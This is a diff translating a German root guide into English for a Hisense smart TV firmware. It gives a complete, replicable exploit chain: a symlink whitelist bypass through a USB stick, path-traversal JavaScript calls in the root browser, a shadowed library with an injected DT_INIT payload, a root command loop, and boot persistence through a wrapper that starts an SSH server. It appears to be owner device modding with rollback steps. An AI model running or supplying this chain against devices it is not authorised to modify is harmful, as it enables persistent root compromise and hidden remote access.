@@ -1,19 +1,19 @@
 # ROOT-GUIDE — Hisense HE40E5600FFWTS (V0100.01.00A.N0410)
 
-**Finaler, replizierbarer Root-Weg.** Kein Flash, kein `.pkg`, kein UART, kein Öffnen des TVs.
-**Ziel-TV:** Hisense HE40E5600FFWTS, FW `V0100.01.00A.N0410`, LAN `192.0.2.94`
-**Host:** Linux mit Python 3, `arm-linux-gnueabihf-*`, optional `qemu-arm`; Host-IP im Beispiel `192.0.2.150`
-**Stand:** 2026-10-26 — Root + Dropbear-SSH (key-only) + PTY live bestätigt; Boot-Persistenz installiert (Reboot-Test offen).
+**Final, reproducible root path.** No flash, no `.pkg`, no UART, no opening the TV.
+**Target TV:** Hisense HE40E5600FFWTS, FW `V0100.01.00A.N0410`, LAN `192.0.2.94`
+**Host:** Linux with Python 3, `arm-linux-gnueabihf-*`, optional `qemu-arm`; host IP in the example `192.0.2.150`
+**Status:** 2026-10-26 — root + Dropbear SSH (key-only) + PTY confirmed live; boot persistence installed (reboot test pending).
 
-Dieser Ordner ist **self-contained**: Payload, Original-Lib, Dropbear-Binaries, Host-/TV-Skripte, Public Key, Host-Key-Fingerprint, Build-Skripte und die Doku liegen hier. Du musst nicht durch den alten Run-Ordner suchen. Die alte `docs/re/...`-Ablage ist nur noch Evidence/Provenienz.
+This folder is **self-contained**: payload, original lib, Dropbear binaries, host/TV scripts, public key, host-key fingerprint, build scripts and the docs are all here. You do not need to search through the old run folder. The old `docs/re/...` location is only evidence/provenance now.
 
 ---
 
-## 0. Ergebnis
+## 0. Result
 
-Beim Boot lädt `hisense_browser` (UID 0, Single-Process, `CapEff=0000003fffffffff`) eine präparierte **`libtvsysinfo.so`** aus `/3rd_rw/loglevel/lib`. Der angehängte `DT_INIT` läuft als root, schreibt den Proof, startet die Root-Loop und ruft danach den Original-Init auf. Über den `HamService`-Wrapper starten Root-Loop und Dropbear bei jedem Boot. SSH ist **key-only**; Login als `root` gibt eine echte Root-Shell mit PTY.
+At boot, `hisense_browser` (UID 0, single-process, `CapEff=0000003fffffffff`) loads a prepared **`libtvsysinfo.so`** from `/3rd_rw/loglevel/lib`. The appended `DT_INIT` runs as root, writes the proof, starts the root loop and then calls the original init. Via the `HamService` wrapper, the root loop and Dropbear start on every boot. SSH is **key-only**; logging in as `root` gives a real root shell with PTY.
 
-Beweis (live):
+Evidence (live):
 
 ```
 /3rd_rw/root_proof.txt = ROOT_EXEC_TVI
@@ -21,66 +21,63 @@ uid=0(root) gid=0(root)
 Uid: 0 0 0 0   Gid: 0 0 0 0   CapEff: 0000003fffffffff
 ```
 
-**Optional SFTP:** Dropbear bringt keinen eigenen `sftp-server` mit. Im Ordner
-liegen ein **statischer OpenSSH-9.9p1-sftp-server** und ein Dropbear mit
-`SFTPSERVER_PATH=/3rd_rw/sshd/sftp-server`; `root/scripts/host/install_sftp.sh`
-installiert beides (Test auf 2222, dann Tausch auf 22). Danach:
-`sftp root@192.0.2.94`. Siehe 9.4.
+**Optional SFTP:** Dropbear does not ship its own `sftp-server`. The folder contains a **static OpenSSH 9.9p1 sftp-server** and a Dropbear with `SFTPSERVER_PATH=/3rd_rw/sshd/sftp-server`; `root/scripts/host/install_sftp.sh` installs both (test on 2222, then swap to 22). Afterwards:
+`sftp root@192.0.2.94`. See 9.4.
 
 ---
 
-## 1. Die Kette (warum das geht)
+## 1. The chain (why this works)
 
-1. **Browser ist root.** `hisense_browser` läuft als UID/GID 0, `CapEff` voll, Single-Process, kein Seccomp/NoNewPrivs. JS im Browser ist root-equivalent.
-2. **USB-Schreibprimitive.** `HSJSX_File::IsSubDentry` prüft `realpath` + Präfix gegen `/3rd_rw/appdata`, `/dev/shm/shm_tmp`, `/3rd/launcher/data`. Ein **dangling Symlink** auf einem ext4-USB lässt `realpath` am fehlenden Ziel scheitern; der Elternpfad `/dev/shm/shm_tmp/mnt/usb/<dev>` ist erlaubt. `fopen` folgt dem Symlink und legt die Zieldatei als root an. Damit sind **neue Root-Dateien** überall anlegbar.
-3. **Loader-Shadow.** `hisense_browser` hat `libtvsysinfo.so` als direktes `NEEDED`; `DT_RPATH=/lib/`, dort liegt sie nicht. `LD_LIBRARY_PATH`-Index 17 ist `/3rd_rw/loglevel/lib` — das erste Verzeichnis, das die Lib liefern kann. Die dort per Symlink-Bypass abgelegte `libtvsysinfo.so` wird beim nächsten Browser-Start geladen.
-4. **DT_INIT-Payload.** Die echte `libtvsysinfo.so` wird um Code am Dateiende erweitert (RX-LOAD `p_filesz/memsz` mit erweitert); `DT_INIT` zeigt auf den neuen Code. Der Code:
-   - `unlink` der eigenen Datei (Selbstschutz),
-   - schreibt `/3rd_rw/root_proof.txt`,
+1. **Browser is root.** `hisense_browser` runs as UID/GID 0, `CapEff` full, single-process, no seccomp/NoNewPrivs. JS in the browser is root-equivalent.
+2. **USB write primitive.** `HSJSX_File::IsSubDentry` checks `realpath` + prefix against `/3rd_rw/appdata`, `/dev/shm/shm_tmp`, `/3rd/launcher/data`. A **dangling symlink** on an ext4 USB stick makes `realpath` fail on the missing target; the parent path `/dev/shm/shm_tmp/mnt/usb/<dev>` is allowed. `fopen` follows the symlink and creates the target file as root. This makes **new root files** creatable anywhere.
+3. **Loader shadow.** `hisense_browser` has `libtvsysinfo.so` as a direct `NEEDED`; `DT_RPATH=/lib/`, where it is not located. `LD_LIBRARY_PATH` index 17 is `/3rd_rw/loglevel/lib` — the first directory that can supply the lib. The `libtvsysinfo.so` placed there via the symlink bypass is loaded on the next browser start.
+4. **DT_INIT payload.** The real `libtvsysinfo.so` is extended with code at the end of the file (RX-LOAD `p_filesz/memsz` extended along with it); `DT_INIT` points to the new code. The code:
+   - `unlink` of its own file (self-protection),
+   - writes `/3rd_rw/root_proof.txt`,
    - `fork` + `execve("/bin/sh", ["/bin/sh", "/3rd_rw/appdata/root_loop.sh"], NULL)`,
-   - ruft den Original-`DT_INIT` per PC-relativem `bl` auf,
-   - kehrt zum Loader zurück.
-5. **Root-Loop.** `/3rd_rw/appdata/root_loop.sh` läuft als root, liest `root_cmd.sh`, führt sie aus und schreibt `root_out.txt`.
-6. **SSH-Persistenz.** `/3rd_rw/hamservice/HamService` ist ein Wrapper: startet Root-Loop + Dropbear, führt danach das echte `/3rd/hamservice/HamService` aus. `startHam.sh` ruft ihn beim Boot als root auf. Dropbear nutzt ein bind-gemountetes `/etc/passwd` (Root-Home `/3rd_rw/sshd/home`) und `~/.ssh/authorized_keys`. PTYs kommen aus einem devpts-Mount auf `/dev/shm/pts`, der auf `/dev/pts` gebindet wird.
+   - calls the original `DT_INIT` via a PC-relative `bl`,
+   - returns to the loader.
+5. **Root loop.** `/3rd_rw/appdata/root_loop.sh` runs as root, reads `root_cmd.sh`, executes it and writes `root_out.txt`.
+6. **SSH persistence.** `/3rd_rw/hamservice/HamService` is a wrapper: starts the root loop + Dropbear, then executes the real `/3rd/hamservice/HamService`. `startHam.sh` calls it at boot as root. Dropbear uses a bind-mounted `/etc/passwd` (root home `/3rd_rw/sshd/home`) and `~/.ssh/authorized_keys`. PTYs come from a devpts mount on `/dev/shm/pts`, which is bind-mounted onto `/dev/pts`.
 
 ---
 
-## 2. Ordner / Artefakte
+## 2. Folder / artifacts
 
 ```
 root/
-  ROOT-GUIDE.md                 # diese Datei
-  README.md                     # kurzer Index
+  ROOT-GUIDE.md                 # this file
+  README.md                     # short index
   tools/
-    server.py                   # Host: recon.html + /pub + /cmd + /recon + /dump
-    recon.html                  # Host: TV-Seite mit fileXHR/listDir/HiBrowser-Hook
-    live_cmd.txt                # optionaler Live-Command-Kanal (leer = nichts)
+    server.py                   # host: recon.html + /pub + /cmd + /recon + /dump
+    recon.html                  # host: TV page with fileXHR/listDir/HiBrowser hook
+    live_cmd.txt                # optional live command channel (empty = nothing)
     pub/
-      libtvsysinfo.so           # finaler Payload (33500 B)
-      dropbear                  # statischer ARM-Dropbear 2022.83 (key-only)
-      dropbear-sftp             # Dropbear mit SFTPSERVER_PATH=/3rd_rw/sshd/sftp-server
+      libtvsysinfo.so           # final payload (33500 B)
+      dropbear                  # static ARM Dropbear 2022.83 (key-only)
+      dropbear-sftp             # Dropbear with SFTPSERVER_PATH=/3rd_rw/sshd/sftp-server
       dropbearkey
-      sftp-server               # statischer OpenSSH 9.9p1 sftp-server
-      authorized_keys           # dein Public Key
-      start_sshd.sh             # TV: Dropbear + passwd/PTY-Bindmounts
-      root_loop.sh              # TV: Root-Kommandokanal
-      hamservice-wrapper.sh     # TV: Boot-Hook, ersetzt /3rd_rw/hamservice/HamService
-      deploy_sshd.sh            # TV: installiert alles (als root ausführen)
-      verify.sh                 # TV: Health-Check
-      rollback.sh               # TV: alles zurückbauen
+      sftp-server               # static OpenSSH 9.9p1 sftp-server
+      authorized_keys           # your public key
+      start_sshd.sh             # TV: Dropbear + passwd/PTY bind mounts
+      root_loop.sh              # TV: root command channel
+      hamservice-wrapper.sh     # TV: boot hook, replaces /3rd_rw/hamservice/HamService
+      deploy_sshd.sh            # TV: installs everything (run as root)
+      verify.sh                 # TV: health check
+      rollback.sh               # TV: tear everything down again
   scripts/
     host/
-      prepare_usb.sh            # Host: ext4/MBR-Stick + Symlinks
-      start_http.sh             # Host: Server auf :9000
-      plant_payload.js          # TV-Konsole: Payload durch tvi schreiben
-      upload_to_appdata.js      # TV-Konsole: Dropbear/Deploy-Dateien nach appdata
-      run_root_cmd.js           # TV-Konsole: root_cmd.sh schreiben/root_out lesen
-      build_payload.sh          # Host: Payload aus tvi_original.so bauen
-      build_tvi_payload.py      # Host: Builder (deterministisch)
-      build_dropbear.sh         # Host: Dropbear aus sources/ bauen
-      build_sftp_server.sh      # Host: statischen sftp-server bauen
-      patch_dropbear_sftp.py    # Host: Dropbear-SFTP-Pfad patchen
-      install_sftp.sh           # Host: SFTP installieren/testen/auf 22 tauschen
+      prepare_usb.sh            # host: ext4/MBR stick + symlinks
+      start_http.sh             # host: server on :9000
+      plant_payload.js          # TV console: write payload via tvi
+      upload_to_appdata.js      # TV console: Dropbear/deploy files to appdata
+      run_root_cmd.js           # TV console: write root_cmd.sh/read root_out
+      build_payload.sh          # host: build payload from tvi_original.so
+      build_tvi_payload.py      # host: builder (deterministic)
+      build_dropbear.sh         # host: build Dropbear from sources/
+      build_sftp_server.sh      # host: build static sftp-server
+      patch_dropbear_sftp.py    # host: patch Dropbear SFTP path
+      install_sftp.sh           # host: install/test SFTP/swap to 22
     tv/
       start_sshd.sh
       root_loop.sh
@@ -88,79 +85,79 @@ root/
       deploy_sshd.sh
       verify.sh
       rollback.sh
-      install_sftp_stage.sh     # TV: sftp-server + Test-Dropbear auf 2222
-      enable_sftp.sh            # TV: Tausch auf 22 planen
-      swap_sftp.sh              # TV: Tausch ausführen (detached)
+      install_sftp_stage.sh     # TV: sftp-server + test Dropbear on 2222
+      enable_sftp.sh            # TV: schedule the swap to 22
+      swap_sftp.sh              # TV: perform the swap (detached)
   artifacts/
-    tvi_original.so             # Original /3rd_rw/tvsysinfo/lib/libtvsysinfo.so (33220 B)
-    keys/authorized_keys        # dein Public Key
+    tvi_original.so             # original /3rd_rw/tvsysinfo/lib/libtvsysinfo.so (33220 B)
+    keys/authorized_keys        # your public key
     keys/host-key-fingerprint.txt
 sources/
-  dropbear-2022.83.tar.bz2      # Offline-Buildquelle (SHA unten)
-  openssh-9.9p1.tar.gz          # Offline-Buildquelle für sftp-server
-modding/                        # die Modding-Doku (eigene Abteilung)
-dead-ends.md                    # kurze Liste der Sackgassen
+  dropbear-2022.83.tar.bz2      # offline build source (SHA below)
+  openssh-9.9p1.tar.gz          # offline build source for sftp-server
+modding/                        # the modding docs (separate section)
+dead-ends.md                    # short list of dead ends
 SHA256SUMS
 ```
 
-**Wichtig:** `root/tools/pub/authorized_keys` enthält **nur** deinen Public Key. Der private Key bleibt auf deinem Rechner und ist nirgends in diesem Ordner.
+**Important:** `root/tools/pub/authorized_keys` contains **only** your public key. The private key stays on your machine and is nowhere in this folder.
 
 ---
 
-## 3. Voraussetzungen
+## 3. Prerequisites
 
-- TV im LAN, erreichbar als `192.0.2.94` (IP ggf. anpassen).
-- Host im selben LAN; Python 3; für den Rebuild: `gcc-arm-linux-gnueabihf`, `binutils-arm-linux-gnueabihf`, `make`, `bzip2`.
-- Optional SFTP: OpenSSH-Client (`sftp`) auf dem Host; der TV braucht keinen Client.
-- USB-Stick, **ext4 mit MBR-Partitionstabelle** (kein Superfloppy). Der TV mountet Partitionen.
-- Der Public Key in `root/tools/pub/authorized_keys` muss zu deinem privaten Key passen. Aktuell:
+- TV in the LAN, reachable as `192.0.2.94` (adjust the IP if needed).
+- Host in the same LAN; Python 3; for the rebuild: `gcc-arm-linux-gnueabihf`, `binutils-arm-linux-gnueabihf`, `make`, `bzip2`.
+- Optional SFTP: OpenSSH client (`sftp`) on the host; the TV needs no client.
+- USB stick, **ext4 with an MBR partition table** (no superfloppy). The TV mounts partitions.
+- The public key in `root/tools/pub/authorized_keys` must match your private key. Currently:
   ```
   <your-public-key>
   ```
-- Host-Key des TV-SSHD (Ed25519):
+- Host key of the TV SSHD (Ed25519):
   ```
   <host-key-fingerprint>
   ```
 
 ---
 
-## 4. Der Weg in Kürze
+## 4. The path in brief
 
 ```
-1. USB-Stick:   sudo root/scripts/host/prepare_usb.sh /dev/sdX
+1. USB stick:   sudo root/scripts/host/prepare_usb.sh /dev/sdX
 2. Server:      root/scripts/host/start_http.sh
-3. TV-Seite:    http://<host-ip>:9000/recon.html
-4. Payload:     root/scripts/host/plant_payload.js  (USB-Dev anpassen) → Reboot
-5. Root prüfen: /3rd_rw/root_proof.txt = ROOT_EXEC_TVI
-6. SSH-Dateien: root/scripts/host/upload_to_appdata.js
+3. TV page:     http://<host-ip>:9000/recon.html
+4. Payload:     root/scripts/host/plant_payload.js  (adjust USB dev) → reboot
+5. Check root:  /3rd_rw/root_proof.txt = ROOT_EXEC_TVI
+6. SSH files:   root/scripts/host/upload_to_appdata.js
 7. Deploy:      root/scripts/host/run_root_cmd.js  → deploy_sshd.sh
-8. Verbinden:   ssh root@192.0.2.94
-9. Persistenz:  HamService-Wrapper ist installiert; Reboot-Test
-10. Rollback:   root/scripts/tv/rollback.sh (auf dem TV, als root)
+8. Connect:     ssh root@192.0.2.94
+9. Persistence: HamService wrapper is installed; reboot test
+10. Rollback:   root/scripts/tv/rollback.sh (on the TV, as root)
 11. SFTP opt.:  root/scripts/host/install_sftp.sh
 ```
 
-Die Schritte im Detail:
+The steps in detail:
 
 ---
 
-## 5. Schritt 1 — USB-Stick (ext4 + MBR + `tvi`-Symlink)
+## 5. Step 1 — USB stick (ext4 + MBR + `tvi` symlink)
 
-### 5.1 Skript
+### 5.1 Script
 
 ```bash
 cd <repo-root>
 sudo root/scripts/host/prepare_usb.sh /dev/sdX
 ```
 
-Das Skript ist **destruktiv**: `wipefs`, MBR, `mkfs.ext4 -O ^64bit,^metadata_csum -L TVSYM`, dann:
+The script is **destructive**: `wipefs`, MBR, `mkfs.ext4 -O ^64bit,^metadata_csum -L TVSYM`, then:
 
 ```
-tvi -> /3rd_rw/loglevel/lib/libtvsysinfo.so   (Pflicht, muss dangling bleiben)
-pwn -> /3rd_rw/root_proof.txt                  (optional, Proof-Target)
+tvi -> /3rd_rw/loglevel/lib/libtvsysinfo.so   (mandatory, must remain dangling)
+pwn -> /3rd_rw/root_proof.txt                 (optional, proof target)
 ```
 
-### 5.2 Manuell (falls du es selbst machen willst)
+### 5.2 Manual (in case you want to do it yourself)
 
 ```bash
 lsblk -f
@@ -170,20 +167,20 @@ sudo mkfs.ext4 -O ^64bit,^metadata_csum -L TVSYM /dev/sdX1
 sudo mkdir -p /mnt/data
 sudo mount /dev/sdX1 /mnt/data
 sudo ln -sfn /3rd_rw/loglevel/lib/libtvsysinfo.so /mnt/data/tvi
-sudo ln -sfn /3rd_rw/root_proof.txt                /mnt/data/pwn
+sudo ln -sfn /3rd_rw/root_proof.txt               /mnt/data/pwn
 sync
 sudo umount /mnt/data
 ```
 
-- **`tvi` muss dangling sein** (Ziel existiert noch nicht). Genau das ist der Whitelist-Bypass.
-- FAT32 kann keine Symlinks; ext4 mit alter Feature-Menge (`^64bit,^metadata_csum`) wird vom 3.18-Kernel gemountet.
-- Ein Whole-Disk-ext4 (Superfloppy, kein `sdX1`) wird **nicht** gemountet.
+- **`tvi` must be dangling** (the target does not exist yet). That is exactly the whitelist bypass.
+- FAT32 cannot do symlinks; ext4 with an old feature set (`^64bit,^metadata_csum`) is mounted by the 3.18 kernel.
+- A whole-disk ext4 (superfloppy, no `sdX1`) is **not** mounted.
 
-Dann Stick in den TV. Der TV mountet ihn als `/dev/shm/shm_tmp/mnt/usb/<dev>` (für JS sichtbar als `/mnt/usb/<dev>`, z. B. `sda1`/`sdb1`/`sdc1`).
+Then insert the stick into the TV. The TV mounts it as `/dev/shm/shm_tmp/mnt/usb/<dev>` (visible to JS as `/mnt/usb/<dev>`, e.g. `sda1`/`sdb1`/`sdc1`).
 
 ---
 
-## 6. Schritt 2 — Host-Server + Recon-Seite
+## 6. Step 2 — Host server + recon page
 
 ```bash
 cd <repo-root>
@@ -191,31 +188,31 @@ root/scripts/host/start_http.sh
 # TV URL: http://<host-ip>:9000/recon.html
 ```
 
-Der Server liefert `recon.html`, `/cmd`, `/recon`, `/dump` und `/pub/*`. Die TV-Seite pollt `/cmd` und führt JS im **root-Browser** aus.
+The server serves `recon.html`, `/cmd`, `/recon`, `/dump` and `/pub/*`. The TV page polls `/cmd` and executes JS in the **root browser**.
 
-Auf dem TV im Browser öffnen:
+Open this on the TV in the browser:
 
 ```
 http://<host-ip>:9000/recon.html
 ```
 
-USB-Dev ermitteln (Konsole/Hook):
+Determine the USB dev (console/hook):
 
 ```js
-listDir("/mnt/usb")          // z. B. "[D] sda1"
-listDir("/mnt/usb/sda1")     // muss "tvi" zeigen
+listDir("/mnt/usb")          // e.g. "[D] sda1"
+listDir("/mnt/usb/sda1")     // must show "tvi"
 ```
 
 ---
 
-## 7. Schritt 3 — Payload schreiben
+## 7. Step 3 — Write the payload
 
-### 7.1 Skript (TV-Konsole)
+### 7.1 Script (TV console)
 
-`root/scripts/host/plant_payload.js` in die Konsole pasten; **`usb` anpassen**:
+Paste `root/scripts/host/plant_payload.js` into the console; **adjust `usb`**:
 
 ```js
-var usb = "/mnt/usb/sda1";                 // <-- aus listDir("/mnt/usb")
+var usb = "/mnt/usb/sda1";                 // <-- from listDir("/mnt/usb")
 var target = "so/../../../../dev/shm/shm_tmp" + usb + "/tvi";
 var url = location.origin + "/pub/libtvsysinfo.so";
 var o = {};
@@ -225,14 +222,14 @@ o.back = HiBrowser.File.download("file:///3rd_rw/loglevel/lib/libtvsysinfo.so",
 o
 ```
 
-Erwartung: `download=0`, `back=0`; danach existiert
+Expected: `download=0`, `back=0`; afterwards this exists:
 
 ```
 /3rd_rw/loglevel/lib/libtvsysinfo.so   33500 B
 SHA-256 37b13f91959acea9b3c3fd4d0e62bb2d4cb41f773add060bef68ac67657f5b0a
 ```
 
-### 7.2 Manuell (ohne JS-Datei)
+### 7.2 Manual (without JS file)
 
 ```js
 HiBrowser.File.download(
@@ -242,40 +239,40 @@ HiBrowser.File.download(
 );
 ```
 
-### 7.3 Verifizieren
+### 7.3 Verify
 
-- `back=0` und die 33.500 B / SHA oben.
-- Optional die zurückgelesene Datei `tvi_check_plant.so` mit `pub/libtvsysinfo.so` vergleichen.
-- **Nicht rebooten**, bevor die Bytes stimmen.
+- `back=0` and the 33.500 B / SHA above.
+- Optionally compare the read-back file `tvi_check_plant.so` with `pub/libtvsysinfo.so`.
+- **Do not reboot** before the bytes are correct.
 
 ### 7.4 Reboot
 
-TV komplett aus- und wieder einschalten. Beim Boot lädt `hisense_browser` die Shadow-Lib aus Index 17; der `DT_INIT` läuft als root.
+Power the TV fully off and on again. At boot `hisense_browser` loads the shadow lib from index 17; the `DT_INIT` runs as root.
 
 ---
 
-## 8. Schritt 4 — Root prüfen / Kommandokanal
+## 8. Step 4 — Check root / command channel
 
-Nach dem Boot Recon-Seite erneut öffnen.
+After the boot, open the recon page again.
 
 ```js
 fileXHR("file:///3rd_rw/root_proof.txt")         // ROOT_EXEC_TVI
-fileXHR("file:///3rd_rw/appdata/root_loop.pid")  // z. B. 1425
-listDir("/3rd_rw/loglevel/lib")                  // nur liblogLevel.so => Self-Unlink ok
+fileXHR("file:///3rd_rw/appdata/root_loop.pid")  // e.g. 1425
+listDir("/3rd_rw/loglevel/lib")                  // only liblogLevel.so => self-unlink ok
 ```
 
-Root-Befehl über den Loop:
+Root command via the loop:
 
 ```js
 HiBrowser.File.write("root_cmd.sh",
   "id\n" +
   "cat /proc/self/status | grep -E '^(Uid|Gid|CapEff):'\n", 1);
 
-// nach ca. 2 s:
+// after about 2 s:
 fileXHR("file:///3rd_rw/appdata/root_out.txt")
 ```
 
-Erwartung:
+Expected:
 
 ```
 uid=0(root) gid=0(root)
@@ -284,69 +281,69 @@ Gid: 0 0 0 0
 CapEff: 0000003fffffffff
 ```
 
-Fertiges Snippet: `root/scripts/host/run_root_cmd.js` (CMD anpassen).
+Ready-made snippet: `root/scripts/host/run_root_cmd.js` (adjust CMD).
 
 ---
 
-## 9. Schritt 5 — Dropbear/SSH installieren
+## 9. Step 5 — Install Dropbear/SSH
 
-### 9.1 Dateien nach `/3rd_rw/appdata` laden
+### 9.1 Load files to `/3rd_rw/appdata`
 
-`root/scripts/host/upload_to_appdata.js` in die TV-Konsole pasten. Es lädt aus `root/tools/pub/`:
+Paste `root/scripts/host/upload_to_appdata.js` into the TV console. It loads from `root/tools/pub/`:
 
 ```
 dropbear dropbearkey authorized_keys start_sshd.sh root_loop.sh
 hamservice-wrapper.sh deploy_sshd.sh verify.sh rollback.sh
 ```
 
-nach `/3rd_rw/appdata`. Erwartung: alle Werte `0`.
+to `/3rd_rw/appdata`. Expected: all values `0`.
 
-### 9.2 Deploy als root (über die Root-Loop)
+### 9.2 Deploy as root (via the root loop)
 
-`root/scripts/host/run_root_cmd.js` mit
+Run `root/scripts/host/run_root_cmd.js` with
 
 ```
 /bin/sh /3rd_rw/appdata/deploy_sshd.sh
 ```
 
-ausführen (oder in der Konsole):
+(or in the console):
 
 ```js
 HiBrowser.File.write("root_cmd.sh", "/bin/sh /3rd_rw/appdata/deploy_sshd.sh\n", 1);
-// nach ca. 5 s:
+// after about 5 s:
 fileXHR("file:///3rd_rw/appdata/root_out.txt")
 ```
 
-`deploy_sshd.sh` macht:
+`deploy_sshd.sh` does:
 
 - `dropbear`/`dropbearkey` → `/3rd_rw/sshd/`
-- Host-Key (`dropbearkey -t ed25519 -f /3rd_rw/sshd/host_key`)
-- `/etc/passwd`-Kopie mit `root:/3rd_rw/sshd/home:/bin/sh`, **bind mount** über `/etc/passwd`
-- devpts auf `/dev/shm/pts`, **bind mount** über `/dev/pts` (PTY; `/dev` ist statisch ro)
-- `authorized_keys` aus dem Public Key
+- host key (`dropbearkey -t ed25519 -f /3rd_rw/sshd/host_key`)
+- `/etc/passwd` copy with `root:/3rd_rw/sshd/home:/bin/sh`, **bind mount** over `/etc/passwd`
+- devpts on `/dev/shm/pts`, **bind mount** over `/dev/pts` (PTY; `/dev` is static ro)
+- `authorized_keys` from the public key
 - `start_sshd.sh` + `root_loop.sh` + `hamservice-wrapper.sh`
-- Start von Dropbear auf `0.0.0.0:22`, key-only
-- Health-Ausgabe (Prozesse, Port, Log, Host-Key, Mounts)
+- start of Dropbear on `0.0.0.0:22`, key-only
+- health output (processes, port, log, host key, mounts)
 
-### 9.3 Verbinden
+### 9.3 Connect
 
 ```bash
 ssh root@192.0.2.94
-# oder, wenn dein Key nicht der Default ist:
-ssh -i ~/.ssh/<dein_privater_key> root@192.0.2.94
+# or, if your key is not the default:
+ssh -i ~/.ssh/<your-private-key> root@192.0.2.94
 ```
 
-Beim ersten Verbinden Host-Key bestätigen:
+On the first connection, confirm the host key:
 
 ```
 ED25519 key fingerprint is <host-key-fingerprint>
 ```
 
-Erwartung: `root@...:~#`, `id` → `uid=0(root)`.
+Expected: `root@...:~#`, `id` → `uid=0(root)`.
 
-**Key-only:** `DROPBEAR_SVR_PASSWORD_AUTH=0` beim Build; es gibt keinen Passwort-Login. Dein Public Key ist der einzige Zugang.
+**Key-only:** `DROPBEAR_SVR_PASSWORD_AUTH=0` at build time; there is no password login. Your public key is the only access.
 
-**PTY:** devpts-Workaround ist im `start_sshd.sh`/`deploy_sshd.sh`. Falls doch `PTY allocation failed`:
+**PTY:** the devpts workaround is in `start_sshd.sh`/`deploy_sshd.sh`. If `PTY allocation failed` still occurs:
 
 ```sh
 mkdir -p /dev/shm/pts
@@ -354,7 +351,7 @@ mount -t devpts -o mode=620,ptmxmode=666,gid=5 devpts /dev/shm/pts
 mount --bind /dev/shm/pts /dev/pts
 ```
 
-Danach erneut verbinden; Dropbear muss nicht neu starten. Fallback ohne PTY:
+Then connect again; Dropbear does not need a restart. Fallback without PTY:
 
 ```bash
 ssh -T root@192.0.2.94 'id; uname -a'
@@ -362,15 +359,15 @@ ssh -T root@192.0.2.94 'id; uname -a'
 
 ### 9.4 SFTP (optional, key-only)
 
-Dropbear hat **keinen eigenen sftp-server**; der Server exec't den
-compile-time `SFTPSERVER_PATH` (Default `/usr/libexec/sftp-server`). Der ro
-Rootfs erlaubt dort keine Datei. Deshalb liegen im Ordner:
+Dropbear has **no sftp-server of its own**; the server execs the compile-time
+`SFTPSERVER_PATH` (default `/usr/libexec/sftp-server`). The ro rootfs allows no
+file there. That is why the folder contains:
 
-- `tools/pub/sftp-server` — statischer OpenSSH-9.9p1-sftp-server (ARM)
-- `tools/pub/dropbear-sftp` — Dropbear mit
+- `tools/pub/sftp-server` — static OpenSSH 9.9p1 sftp-server (ARM)
+- `tools/pub/dropbear-sftp` — Dropbear with
   `SFTPSERVER_PATH=/3rd_rw/sshd/sftp-server`
 
-Installation vom Host (nutzt deinen SSH-Key; ein `sftp`-Client wird nur für den Test benötigt):
+Installation from the host (uses your SSH key; an `sftp` client is only needed for the test):
 
 ```bash
 cd <repo-root>
@@ -378,10 +375,10 @@ root/scripts/host/install_sftp.sh
 # optional: TV=root@192.0.2.94 SSH_KEY=~/.ssh/id_ed25519 ...
 ```
 
-Ablauf: lädt beide Binaries nach `/3rd_rw/appdata`; startet einen
-**Test-Dropbear auf Port 2222** (Port 22 bleibt unangetastet); testet
-`sftp -P 2222`; nur bei Erfolg wird der Binary auf 22 getauscht
-(Backup: `/3rd_rw/sshd/dropbear.nosftp`). Danach:
+Procedure: loads both binaries to `/3rd_rw/appdata`; starts a
+**test Dropbear on port 2222** (port 22 stays untouched); tests
+`sftp -P 2222`; only on success is the binary swapped to 22
+(backup: `/3rd_rw/sshd/dropbear.nosftp`). Afterwards:
 
 ```bash
 sftp root@192.0.2.94
@@ -397,14 +394,14 @@ ssh root@192.0.2.94 \
    /bin/sh /3rd_rw/sshd/start_sshd.sh'
 ```
 
-**SFTP ist root-equivalent** (Login als root), key-only, nur LAN. Es ist
-derselbe Zugang wie SSH; keine zusätzlichen Credentials.
+**SFTP is root-equivalent** (login as root), key-only, LAN only. It is
+the same access as SSH; no additional credentials.
 
 ---
 
-## 10. Schritt 6 — Persistenz (Boot)
+## 10. Step 6 — Persistence (boot)
 
-`deploy_sshd.sh` installiert bereits `/3rd_rw/hamservice/HamService`:
+`deploy_sshd.sh` already installs `/3rd_rw/hamservice/HamService`:
 
 ```sh
 #!/bin/sh
@@ -415,37 +412,37 @@ export PATH
 exec /3rd/hamservice/HamService "$@"
 ```
 
-Boot-Ablauf:
+Boot sequence:
 
-1. `startHam.sh` wechselt nach `/3rd_rw/hamservice`.
+1. `startHam.sh` changes to `/3rd_rw/hamservice`.
 2. `[ -e HamService ] && [ -x HamService ]` → `./HamService &`.
-3. Wrapper startet Root-Loop + Dropbear (Bind-Mounts/PTY), `exec`t dann das echte `/3rd/hamservice/HamService`.
-4. Root-Loop und Dropbear laufen als root weiter.
+3. The wrapper starts the root loop + Dropbear (bind mounts/PTY), then `exec`s the real `/3rd/hamservice/HamService`.
+4. Root loop and Dropbear keep running as root.
 
-**Reboot-Test:** TV neu starten; danach:
+**Reboot test:** restart the TV; then:
 
 ```bash
 ssh root@192.0.2.94 'id; ps | grep -E "dropbear|root_loop"'
 ```
 
-Oder auf dem TV: `/bin/sh /3rd_rw/appdata/verify.sh`.
+Or on the TV: `/bin/sh /3rd_rw/appdata/verify.sh`.
 
-**Alternative für frühe Mods:** `/3rd_rw/developer.sh` (wird von `/basic/autorun.sh` Zeile 90 als root ausgeführt, **vor** `ms_service`/`hisenseUI`/`app_man`/`delayrun`). Siehe `modding/02-boot.md` und `modding/04-modding.md`.
+**Alternative for early mods:** `/3rd_rw/developer.sh` (executed as root by `/basic/autorun.sh` line 90, **before** `ms_service`/`hisenseUI`/`app_man`/`delayrun`). See `modding/02-boot.md` and `modding/04-modding.md`.
 
 ---
 
-## 11. Schritt 7 — Rollback
+## 11. Step 7 — Rollback
 
-### 11.1 Skript (TV, als root)
+### 11.1 Script (TV, as root)
 
 ```sh
 /bin/sh /3rd_rw/appdata/rollback.sh
-# oder aus diesem Ordner hochladen und ausführen
+# or upload from this folder and run it
 ```
 
-Es stoppt Loop/Dropbear, stellt den HamService-Symlink wieder her, unmountet `/etc/passwd`/`/dev/pts`/`/dev/shm/pts`, entfernt `/3rd_rw/sshd`, die Shadow-Lib und die alten ms-/appdata-Payloads. Danach Reboot.
+It stops the loop/Dropbear, restores the HamService symlink, unmounts `/etc/passwd`/`/dev/pts`/`/dev/shm/pts`, removes `/3rd_rw/sshd`, the shadow lib and the old ms/appdata payloads. Then reboot.
 
-### 11.2 Manuell
+### 11.2 Manual
 
 ```sh
